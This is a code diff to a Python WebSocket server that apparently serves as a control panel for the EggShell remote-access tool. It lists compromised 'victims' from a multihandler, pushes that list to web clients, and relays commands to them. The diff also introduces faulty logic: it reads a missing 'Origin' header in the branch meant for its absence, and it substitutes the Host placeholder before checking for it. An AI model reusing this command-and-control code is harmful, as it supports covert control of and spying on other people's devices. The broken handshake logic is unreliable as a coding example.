@@ -88,9 +88,17 @@ class WsServer:
 
         sec_key = headers['Sec-WebSocket-Key']
         res_key = base64.b64encode(hashlib.sha1(sec_key + MAGIC_STRING).digest())
-        str_handshake = HANDSHAKE_STRING.replace('{1}', res_key).replace('{2}', headers['Origin']).replace('{3}',
-                                                                                                           headers[
-                                                                                                               'Host'])
+        str_handshake = HANDSHAKE_STRING.replace('{1}', res_key)
+        if 'Origin' in headers:
+            str_handshake = str_handshake.replace('{2}', headers['Origin']).replace('{3}', headers['Host'])
+        else:
+            str_handshake = str_handshake.replace('{2}', headers['Origin']).replace('{3}', "*")
+        if 'Host' in headers:
+            str_handshake = str_handshake.replace('{3}', headers['Host'])
+        else:
+            str_handshake = str_handshake.replace('{3}', "WsServer")
+
+
         conn.send(str_handshake)  # 发送建立连接的信息
         print ('%s : Socket handshaken with %s:%s success' % (thread_name, address[0], address[1]))
         print ('Start transmitting data...')
@@ -153,11 +161,17 @@ class WsServer:
                         self.send_data(conn, json.dumps(response))
 #                   conn.send(b'screenshot')
                     print(id, cmd, para)
+                else:
+                    response["status"] = "Fail"
+                    response["content_type"] = ""
+                    response["content"] = ""
+                    self.send_data(conn, json.dumps(response))
         conn.sendall(b'bye')
         conn.close()
 
 
     def push_data(self, conn, address, thread_name):
+        self.update_info(conn)
         while True:
             if self.eggshell.server.multihandler.victims_modify:
                 self.update_info(conn)
@@ -166,14 +180,13 @@ class WsServer:
 
 
     def update_info(self, conn):
-        if self.eggshell.server.multihandler.victims_modify:
-            victims = self.eggshell.server.multihandler.victims
-            response = {}
-            response["status"] = "Success"
-            response["content_type"] = "json"
-            response["content"] = victims
-            self.send_data(conn, json.dumps(response))
-            self.eggshell.server.multihandler.victims_modify = False
+        victims = self.eggshell.server.multihandler.victims
+        response = {}
+        response["status"] = "Success"
+        response["content_type"] = "json"
+        response["content"] = victims
+        self.send_data(conn, json.dumps(response))
+        self.eggshell.server.multihandler.victims_modify = False
 
 
     def ws_service(self):
